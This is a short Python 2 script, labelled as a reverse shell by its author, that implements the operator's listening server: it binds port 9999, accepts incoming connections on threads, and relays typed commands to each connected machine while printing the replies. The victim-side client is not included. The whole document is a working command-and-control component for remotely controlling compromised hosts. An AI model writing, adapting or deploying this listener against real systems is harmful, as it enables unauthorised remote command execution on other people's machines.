#reverse_shell_by_rajpal_arora
#server
import socket
import sys
import thread

def send_command(conn,addr):
    while True:
        cmd=raw_input()
        if cmd == 'quit' :
            conn.close()
            s.close()
            sys.exit()
        conn.sendall(cmd)
        reply=conn.recv(1024)
        rply=''.join(reply)+ ">"
        sys.stdout.write(rply)

s=socket.socket()
host=''
port=9999
print "Binding socket"
try:
    s.bind((host,port))
except:
    print "error in binding socket"
    sys.exit()
print "listening for connections"
s.listen(10)
print "accepting connections..."
while True:
    try:
        conn,addr=s.accept()
        print "Connected to " + str(addr[0]) + " at port : " + str(addr[1])
    except:
        print "error in accepting connection"
        sys.exit()
    thread.start_new_thread(send_command,(conn,addr))
s.close()
